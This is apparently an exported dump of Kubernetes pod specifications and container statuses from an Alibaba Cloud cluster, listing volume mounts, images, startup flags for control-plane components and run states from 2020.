+"[{""name"":""cni"",""mountPath"":""/etc/cni/net.d""},{""name"":""flannel-cfg"",""mountPath"":""/etc/kube-flannel/""},{""name"":""flannel-token-pblrl"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}"
+"[{""name"":""config-volume"",""configMap"":{""name"":""coredns"",""items"":[{""key"":""Corefile"",""path"":""Corefile""}"
+"[{""name"":""config-volume"",""readOnly"":true,""mountPath"":""/etc/coredns""},{""name"":""timezone"",""mountPath"":""/etc/localtime""},{""name"":""coredns-token-d79rf"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}"
+"[{""name"":""coredns"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/coredns:1.6.2"",""args"":[""-conf"",""/etc/coredns/Corefile"""
+"[{""name"":""coredns"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:53Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/coredns:1.6.2"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/coredns@sha256:4dd4d0e5bcc9bd0e8189f6fa4d4965ffa81207d8d99d29391f28cbd1a70a0163"",""containerID"":""docker://d4d605b9579b78611cc77a198455e54d50a7a14957779c3c75112b423fc47242"",""started"":true}"
+"[{""name"":""coredns"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:53Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/coredns:1.6.2"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/coredns@sha256:4dd4d0e5bcc9bd0e8189f6fa4d4965ffa81207d8d99d29391f28cbd1a70a0163"",""containerID"":""docker://ea914da329aba6450d865eb6e65df2a5bca07584bc6660c4fabf8adc0c39897a"",""started"":true}"
+"[{""name"":""dns"",""containerPort"":53,""protocol"":""UDP""},{""name"":""dns-tcp"",""containerPort"":53,""protocol"":""TCP""},{""name"":""metrics"",""containerPort"":9153,""protocol"":""TCP""}"
+"[{""name"":""http"",""containerPort"":80,""protocol"":""TCP""},{""name"":""https"",""containerPort"":443,""protocol"":""TCP""}"
+"[{""name"":""init-sysctl"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/busybox:v1.29.2"",""command"":[""/bin/sh"",""-c"",""mount -o remount rw /proc/sys\nsysctl -w net.core.somaxconn=65535\nsysctl -w net.ipv4.ip_local_port_range=\""1024 65535\""\nsysctl -w fs.file-max=1048576\nsysctl -w fs.inotify.max_user_instances=16384\nsysctl -w fs.inotify.max_user_watches=524288\nsysctl -w fs.inotify.max_queued_events=16384\n"""
+"[{""name"":""init-sysctl"",""state"":{""terminated"":{""exitCode"":0,""reason"":""Completed"",""startedAt"":""2020-04-08T04:13:03Z"",""finishedAt"":""2020-04-08T04:13:03Z"",""containerID"":""docker://fa0bc6f12f5f04b95c3bca042e7c44b856988fb20dca26b48db60eab9b3d0841""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/busybox:v1.29.2"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/busybox@sha256:5e8e0509e829bb8f990249135a36e81a3ecbe94294e7a185cc14616e5fad96bd"",""containerID"":""docker://fa0bc6f12f5f04b95c3bca042e7c44b856988fb20dca26b48db60eab9b3d0841""}"
+"[{""name"":""init-sysctl"",""state"":{""terminated"":{""exitCode"":0,""reason"":""Completed"",""startedAt"":""2020-04-08T04:13:22Z"",""finishedAt"":""2020-04-08T04:13:22Z"",""containerID"":""docker://1d50836144b1807267d3b00107e6858dcf87dc1fd1065ef5d6c6d746aa5209a3""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/busybox:v1.29.2"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/busybox@sha256:5e8e0509e829bb8f990249135a36e81a3ecbe94294e7a185cc14616e5fad96bd"",""containerID"":""docker://1d50836144b1807267d3b00107e6858dcf87dc1fd1065ef5d6c6d746aa5209a3""}"
+"[{""name"":""install-cni"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""command"":[""/bin/sh"",""-c"",""set -e -x; cp -f /etc/kube-flannel/cni-conf.json /etc/cni/net.d/10-flannel.conf"""
+"[{""name"":""install-cni"",""state"":{""terminated"":{""exitCode"":0,""reason"":""Completed"",""startedAt"":""2020-04-08T04:12:37Z"",""finishedAt"":""2020-04-08T04:12:37Z"",""containerID"":""docker://992cb3ccc8d8befb3f2c889838478e7270d66d0d5e5b2315bd93ea7e2f9fb425""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://992cb3ccc8d8befb3f2c889838478e7270d66d0d5e5b2315bd93ea7e2f9fb425""}"
+"[{""name"":""install-cni"",""state"":{""terminated"":{""exitCode"":0,""reason"":""Completed"",""startedAt"":""2020-04-08T04:12:41Z"",""finishedAt"":""2020-04-08T04:12:41Z"",""containerID"":""docker://07a3b26a814dfcdf8643db99e97833487233e3f859b49cf09b80326c3e8c1d3c""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://07a3b26a814dfcdf8643db99e97833487233e3f859b49cf09b80326c3e8c1d3c""}"
+"[{""name"":""install-cni"",""state"":{""terminated"":{""exitCode"":0,""reason"":""Completed"",""startedAt"":""2020-04-08T04:12:41Z"",""finishedAt"":""2020-04-08T04:12:41Z"",""containerID"":""docker://a2fe681655f7e79a0c7ee942e9a56f9d45d72e5b16631625fd06d14750c3a79e""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://a2fe681655f7e79a0c7ee942e9a56f9d45d72e5b16631625fd06d14750c3a79e""}"
+"[{""name"":""install-cni"",""state"":{""terminated"":{""exitCode"":0,""reason"":""Completed"",""startedAt"":""2020-04-08T04:12:45Z"",""finishedAt"":""2020-04-08T04:12:45Z"",""containerID"":""docker://3ae2d8464413d193546c31e1ee4bfe0d1f832fd52c2583b91f4e80bafc60e7fc""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://3ae2d8464413d193546c31e1ee4bfe0d1f832fd52c2583b91f4e80bafc60e7fc""}"
+"[{""name"":""install-cni"",""state"":{""terminated"":{""exitCode"":0,""reason"":""Completed"",""startedAt"":""2020-04-08T04:12:46Z"",""finishedAt"":""2020-04-08T04:12:46Z"",""containerID"":""docker://f9a6743f6056c7c58f7cfcea0ab2ad46c9ac83f78670b0153964d4aff82b48be""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://f9a6743f6056c7c58f7cfcea0ab2ad46c9ac83f78670b0153964d4aff82b48be""}"
+"[{""name"":""install-cni"",""state"":{""terminated"":{""exitCode"":0,""reason"":""Completed"",""startedAt"":""2020-09-10T07:23:39Z"",""finishedAt"":""2020-09-10T07:23:39Z"",""containerID"":""docker://d9ca116d797c8be92c930e377510af17bab00d32aef59c6592cf610b1fc965eb""}},""lastState"":{},""ready"":true,""restartCount"":1,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://d9ca116d797c8be92c930e377510af17bab00d32aef59c6592cf610b1fc965eb""}"
+"[{""name"":""k8s"",""hostPath"":{""path"":""/etc/kubernetes"",""type"":""""}},{""name"":""certs"",""hostPath"":{""path"":""/etc/ssl/certs"",""type"":""""}},{""name"":""pki"",""hostPath"":{""path"":""/etc/pki"",""type"":""""}},{""name"":""cloud-config"",""configMap"":{""name"":""cloud-config"",""items"":[{""key"":""cloud-config.conf"",""path"":""cloud-config.conf""}"
+"[{""name"":""k8s"",""mountPath"":""/etc/kubernetes/""},{""name"":""certs"",""mountPath"":""/etc/ssl/certs""},{""name"":""pki"",""mountPath"":""/etc/pki""},{""name"":""cloud-config"",""mountPath"":""/etc/kubernetes/config""},{""name"":""cloud-controller-manager-token-hrbpn"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}"
+"[{""name"":""k8s-audit"",""hostPath"":{""path"":""/var/log/kubernetes"",""type"":""DirectoryOrCreate""}},{""name"":""audit-policy"",""hostPath"":{""path"":""/etc/kubernetes/audit-policy.yml"",""type"":""FileOrCreate""}},{""name"":""ca-certs"",""hostPath"":{""path"":""/etc/ssl/certs"",""type"":""DirectoryOrCreate""}},{""name"":""etc-pki"",""hostPath"":{""path"":""/etc/pki"",""type"":""DirectoryOrCreate""}},{""name"":""k8s-certs"",""hostPath"":{""path"":""/etc/kubernetes/pki"",""type"":""DirectoryOrCreate""}},{""name"":""localtime"",""hostPath"":{""path"":""/etc/localtime"",""type"":""""}}"
+"[{""name"":""k8s-audit"",""mountPath"":""/var/log/kubernetes""},{""name"":""audit-policy"",""readOnly"":true,""mountPath"":""/etc/kubernetes/audit-policy.yml""},{""name"":""ca-certs"",""readOnly"":true,""mountPath"":""/etc/ssl/certs""},{""name"":""etc-pki"",""readOnly"":true,""mountPath"":""/etc/pki""},{""name"":""k8s-certs"",""readOnly"":true,""mountPath"":""/etc/kubernetes/pki""},{""name"":""localtime"",""mountPath"":""/etc/localtime""}"
+"[{""name"":""kube-apiserver"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver:v1.16.6-aliyun.1"",""command"":[""kube-apiserver"",""--audit-log-maxbackup=10"",""--audit-log-maxsize=100"",""--audit-log-path=/var/log/kubernetes/kubernetes.audit"",""--audit-log-maxage=30"",""--audit-policy-file=/etc/kubernetes/audit-policy.yml"",""--apiserver-count=500"",""--endpoint-reconciler-type=lease"",""--enable-aggregator-routing=true"",""--runtime-config=admissionregistration.k8s.io/v1beta1,extensions/v1beta1/daemonsets=true,extensions/v1beta1/deployments=true,extensions/v1beta1/replicasets=true,extensions/v1beta1/networkpolicies=true,extensions/v1beta1/podsecuritypolicies=true,apps/v1beta1=true,apps/v1beta2=true"",""--advertise-address=192.168.0.150"",""--allow-privileged=true"",""--authorization-mode=Node,RBAC"",""--client-ca-file=/etc/kubernetes/pki/apiserver-ca.crt"",""--cloud-provider=external"",""--enable-admission-plugins=NodeRestriction,PodSecurityPolicy"",""--enable-bootstrap-token-auth=true"",""--etcd-cafile=/etc/kubernetes/pki/etcd/ca.pem"",""--etcd-certfile=/etc/kubernetes/pki/etcd/etcd-client.pem"",""--etcd-keyfile=/etc/kubernetes/pki/etcd/etcd-client-key.pem"",""--etcd-servers=https://192.168.0.150:2379,https://192.168.0.151:2379,https://192.168.0.152:2379"",""--feature-gates=VolumeSnapshotDataSource=true,CSINodeInfo=true,CSIDriverRegistry=true"",""--insecure-port=0"",""--kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt"",""--kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key"",""--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname"",""--profiling=false"",""--proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt"",""--proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key"",""--requestheader-allowed-names=front-proxy-client"",""--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt"",""--requestheader-extra-headers-prefix=X-Remote-Extra-"",""--requestheader-group-headers=X-Remote-Group"",""--requestheader-username-headers=X-Remote-User"",""--secure-port=6443"",""--service-account-key-file=/etc/kubernetes/pki/sa.pub"",""--service-cluster-ip-range=172.21.0.0/20"",""--service-node-port-range=30000-32767"",""--tls-cert-file=/etc/kubernetes/pki/apiserver.crt"",""--tls-private-key-file=/etc/kubernetes/pki/apiserver.key"""
+"[{""name"":""kube-apiserver"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver:v1.16.6-aliyun.1"",""command"":[""kube-apiserver"",""--audit-log-maxbackup=10"",""--audit-log-maxsize=100"",""--audit-log-path=/var/log/kubernetes/kubernetes.audit"",""--audit-log-maxage=30"",""--audit-policy-file=/etc/kubernetes/audit-policy.yml"",""--apiserver-count=500"",""--endpoint-reconciler-type=lease"",""--enable-aggregator-routing=true"",""--runtime-config=admissionregistration.k8s.io/v1beta1,extensions/v1beta1/daemonsets=true,extensions/v1beta1/deployments=true,extensions/v1beta1/replicasets=true,extensions/v1beta1/networkpolicies=true,extensions/v1beta1/podsecuritypolicies=true,apps/v1beta1=true,apps/v1beta2=true"",""--advertise-address=192.168.0.151"",""--allow-privileged=true"",""--authorization-mode=Node,RBAC"",""--client-ca-file=/etc/kubernetes/pki/apiserver-ca.crt"",""--cloud-provider=external"",""--enable-admission-plugins=NodeRestriction,PodSecurityPolicy"",""--enable-bootstrap-token-auth=true"",""--etcd-cafile=/etc/kubernetes/pki/etcd/ca.pem"",""--etcd-certfile=/etc/kubernetes/pki/etcd/etcd-client.pem"",""--etcd-keyfile=/etc/kubernetes/pki/etcd/etcd-client-key.pem"",""--etcd-servers=https://192.168.0.150:2379,https://192.168.0.151:2379,https://192.168.0.152:2379"",""--feature-gates=VolumeSnapshotDataSource=true,CSINodeInfo=true,CSIDriverRegistry=true"",""--insecure-port=0"",""--kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt"",""--kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key"",""--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname"",""--profiling=false"",""--proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt"",""--proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key"",""--requestheader-allowed-names=front-proxy-client"",""--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt"",""--requestheader-extra-headers-prefix=X-Remote-Extra-"",""--requestheader-group-headers=X-Remote-Group"",""--requestheader-username-headers=X-Remote-User"",""--secure-port=6443"",""--service-account-key-file=/etc/kubernetes/pki/sa.pub"",""--service-cluster-ip-range=172.21.0.0/20"",""--service-node-port-range=30000-32767"",""--tls-cert-file=/etc/kubernetes/pki/apiserver.crt"",""--tls-private-key-file=/etc/kubernetes/pki/apiserver.key"""
+"[{""name"":""kube-apiserver"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver:v1.16.6-aliyun.1"",""command"":[""kube-apiserver"",""--audit-log-maxbackup=10"",""--audit-log-maxsize=100"",""--audit-log-path=/var/log/kubernetes/kubernetes.audit"",""--audit-log-maxage=30"",""--audit-policy-file=/etc/kubernetes/audit-policy.yml"",""--apiserver-count=500"",""--endpoint-reconciler-type=lease"",""--enable-aggregator-routing=true"",""--runtime-config=admissionregistration.k8s.io/v1beta1,extensions/v1beta1/daemonsets=true,extensions/v1beta1/deployments=true,extensions/v1beta1/replicasets=true,extensions/v1beta1/networkpolicies=true,extensions/v1beta1/podsecuritypolicies=true,apps/v1beta1=true,apps/v1beta2=true"",""--advertise-address=192.168.0.152"",""--allow-privileged=true"",""--authorization-mode=Node,RBAC"",""--client-ca-file=/etc/kubernetes/pki/apiserver-ca.crt"",""--cloud-provider=external"",""--enable-admission-plugins=NodeRestriction,PodSecurityPolicy"",""--enable-bootstrap-token-auth=true"",""--etcd-cafile=/etc/kubernetes/pki/etcd/ca.pem"",""--etcd-certfile=/etc/kubernetes/pki/etcd/etcd-client.pem"",""--etcd-keyfile=/etc/kubernetes/pki/etcd/etcd-client-key.pem"",""--etcd-servers=https://192.168.0.150:2379,https://192.168.0.151:2379,https://192.168.0.152:2379"",""--feature-gates=VolumeSnapshotDataSource=true,CSINodeInfo=true,CSIDriverRegistry=true"",""--insecure-port=0"",""--kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt"",""--kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key"",""--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname"",""--profiling=false"",""--proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt"",""--proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key"",""--requestheader-allowed-names=front-proxy-client"",""--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt"",""--requestheader-extra-headers-prefix=X-Remote-Extra-"",""--requestheader-group-headers=X-Remote-Group"",""--requestheader-username-headers=X-Remote-User"",""--secure-port=6443"",""--service-account-key-file=/etc/kubernetes/pki/sa.pub"",""--service-cluster-ip-range=172.21.0.0/20"",""--service-node-port-range=30000-32767"",""--tls-cert-file=/etc/kubernetes/pki/apiserver.crt"",""--tls-private-key-file=/etc/kubernetes/pki/apiserver.key"""
+"[{""name"":""kube-apiserver"",""state"":{""running"":{""startedAt"":""2020-04-08T04:08:55Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver@sha256:fee22221e79180ebbfa2641ff66d033ef52fe887e112761a8911bf86ae345e1c"",""containerID"":""docker://612cd2c7815ee0ca70b278051b01129007c7d2d2d5c946d6a6c3d6ca55fab92a"",""started"":true}"
+"[{""name"":""kube-apiserver"",""state"":{""running"":{""startedAt"":""2020-04-08T04:09:03Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver@sha256:fee22221e79180ebbfa2641ff66d033ef52fe887e112761a8911bf86ae345e1c"",""containerID"":""docker://4ab12460c914840ef86e6096faa438339096d5c0e6da88c66dd2b9ac47f76c0d"",""started"":true}"
+"[{""name"":""kube-apiserver"",""state"":{""running"":{""startedAt"":""2020-09-10T07:23:26Z""}},""lastState"":{""terminated"":{""exitCode"":255,""reason"":""Error"",""startedAt"":""2020-04-08T04:08:45Z"",""finishedAt"":""2020-09-10T07:23:17Z"",""containerID"":""docker://e6b39e8558945aa0943c5daffca465205aa932ae574e5d236b7a73a0e7afd376""}},""ready"":true,""restartCount"":1,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-apiserver@sha256:fee22221e79180ebbfa2641ff66d033ef52fe887e112761a8911bf86ae345e1c"",""containerID"":""docker://2ba1f9a5390f9af1b61e8a0101f872a85b510f4af4b87aa9f5b2a4fca30657c0"",""started"":true}"
+"[{""name"":""kube-controller-manager"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-controller-manager:v1.16.6-aliyun.1"",""command"":[""kube-controller-manager"",""--experimental-cluster-signing-duration=87600h0m0s"",""--allocate-node-cidrs=true"",""--authentication-kubeconfig=/etc/kubernetes/controller-manager.conf"",""--authorization-kubeconfig=/etc/kubernetes/controller-manager.conf"",""--bind-address=127.0.0.1"",""--client-ca-file=/etc/kubernetes/pki/ca.crt"",""--cloud-provider=external"",""--cluster-cidr=172.20.0.0/16"",""--cluster-signing-cert-file=/etc/kubernetes/pki/ca.crt"",""--cluster-signing-key-file=/etc/kubernetes/pki/ca.key"",""--controllers=*,bootstrapsigner,tokencleaner"",""--horizontal-pod-autoscaler-use-rest-clients=true"",""--kubeconfig=/etc/kubernetes/controller-manager.conf"",""--leader-elect=true"",""--node-cidr-mask-size=26"",""--profiling=false"",""--requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt"",""--root-ca-file=/etc/kubernetes/pki/ca.crt"",""--service-account-private-key-file=/etc/kubernetes/pki/sa.key"",""--service-cluster-ip-range=172.21.0.0/20"",""--use-service-account-credentials=true"""
+"[{""name"":""kube-controller-manager"",""state"":{""running"":{""startedAt"":""2020-04-08T04:06:58Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-controller-manager:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-controller-manager@sha256:ec269c6046cc283c5e0c80c19722310ed1f29f9fccde8c89a08b294222ff5441"",""containerID"":""docker://85456ba47f9dd887c4ba158fc86885e8cd52dbf662c10dbbe5682d0f0ddcb2d4"",""started"":true}"
+"[{""name"":""kube-controller-manager"",""state"":{""running"":{""startedAt"":""2020-04-08T04:08:45Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-controller-manager:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-controller-manager@sha256:ec269c6046cc283c5e0c80c19722310ed1f29f9fccde8c89a08b294222ff5441"",""containerID"":""docker://3d16ef6d38358857f4aab186e73dec8f0c7339453540de0425b74aaa20395855"",""started"":true}"
+"[{""name"":""kube-controller-manager"",""state"":{""running"":{""startedAt"":""2020-09-10T07:23:26Z""}},""lastState"":{""terminated"":{""exitCode"":255,""reason"":""Error"",""startedAt"":""2020-04-08T04:05:10Z"",""finishedAt"":""2020-09-10T07:23:17Z"",""containerID"":""docker://11c5e8dbbffb6d1cc601d211be42873542271ac87073dd1461ea6d6553c0c138""}},""ready"":true,""restartCount"":1,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-controller-manager:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-controller-manager@sha256:ec269c6046cc283c5e0c80c19722310ed1f29f9fccde8c89a08b294222ff5441"",""containerID"":""docker://204a05eafbbe413fba42031de977db911a80032a2dcdaa7883211eb662bc551a"",""started"":true}"
+"[{""name"":""kube-flannel"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""command"":[""/opt/bin/flanneld"",""--ip-masq"",""--kube-subnet-mgr"""
+"[{""name"":""kube-flannel"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:39Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://b94f3946e44f89210a14788e570039a8f19cd5fc89b53c5362499f65fa270142"",""started"":true}"
+"[{""name"":""kube-flannel"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:42Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://273680e9106de1bc3f1660839bf2f4e9322d4e0d6f7af77ad56c3f8865b36b8b"",""started"":true}"
+"[{""name"":""kube-flannel"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:42Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://fd4ad685db257927caacea7a42cb0745b2d19b16f1e18a47d174263a3da2fe59"",""started"":true}"
+"[{""name"":""kube-flannel"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:46Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://09e161af05eb22861527b8cf4052f2f11ebaed325bb97c4b574a310721bf3ffe"",""started"":true}"
+"[{""name"":""kube-flannel"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:47Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://8954f7e618772b2b2a16525fdfa7c75dee71dbdaedd0f087d477820c9db88ce7"",""started"":true}"
+"[{""name"":""kube-flannel"",""state"":{""running"":{""startedAt"":""2020-09-10T07:23:41Z""}},""lastState"":{""terminated"":{""exitCode"":255,""reason"":""Error"",""startedAt"":""2020-04-08T04:12:43Z"",""finishedAt"":""2020-09-10T07:23:17Z"",""containerID"":""docker://e75d968cc7b54f61e5f5703ab81bd55699c314c17fa3c7c7048a5c99177d6946""}},""ready"":true,""restartCount"":1,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/flannel:v0.11.0.1-g6e46593e-aliyun"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/flannel@sha256:db1aa2338757ae61497b2ae72cf4ffda092630e715dcca3f1c801f7ca71b860c"",""containerID"":""docker://6e8f580e56d50ab4315db999ce2434dad545e3d652d97a83c808c62bd7dbf75f"",""started"":true}"
+"[{""name"":""kube-proxy-master"",""configMap"":{""name"":""kube-proxy-master"",""defaultMode"":420}},{""name"":""xtables-lock"",""hostPath"":{""path"":""/run/xtables.lock"",""type"":""FileOrCreate""}},{""name"":""lib-modules"",""hostPath"":{""path"":""/lib/modules"",""type"":""""}},{""name"":""kube-proxy-token-9ngpd"",""secret"":{""secretName"":""kube-proxy-token-9ngpd"",""defaultMode"":420}}"
+"[{""name"":""kube-proxy-master"",""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy:v1.16.6-aliyun.1"",""command"":[""/usr/local/bin/kube-proxy"",""--config=/var/lib/kube-proxy/config.conf"",""--hostname-override=$(NODE_NAME)"""
+"[{""name"":""kube-proxy-master"",""mountPath"":""/var/lib/kube-proxy""},{""name"":""xtables-lock"",""mountPath"":""/run/xtables.lock""},{""name"":""lib-modules"",""readOnly"":true,""mountPath"":""/lib/modules""},{""name"":""kube-proxy-token-9ngpd"",""readOnly"":true,""mountPath"":""/var/run/secrets/kubernetes.io/serviceaccount""}"
+"[{""name"":""kube-proxy-master"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:32Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy@sha256:7d98f65fc3518b384b0fd047a3249f6ea2546168a69a78ef750d80866d1aa0de"",""containerID"":""docker://4ef30a4da0ac22571d6208489ddbf7e5a57788c2c3094e9df6d18678436b1c5f"",""started"":true}"
+"[{""name"":""kube-proxy-master"",""state"":{""running"":{""startedAt"":""2020-04-08T04:12:32Z""}},""lastState"":{},""ready"":true,""restartCount"":0,""image"":""registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy:v1.16.6-aliyun.1"",""imageID"":""docker-pullable://registry-vpc.cn-beijing.aliyuncs.com/acs/kube-proxy@sha256:7d98f65fc3518b384b0fd047a3249f6ea2546168a69a78ef750d80866d1aa0de"",""containerID"":""docker://99dd49254f15530507286069a374e6b38ed814cd926378f1a975aaf7dd27ee29"",""started"":true}"
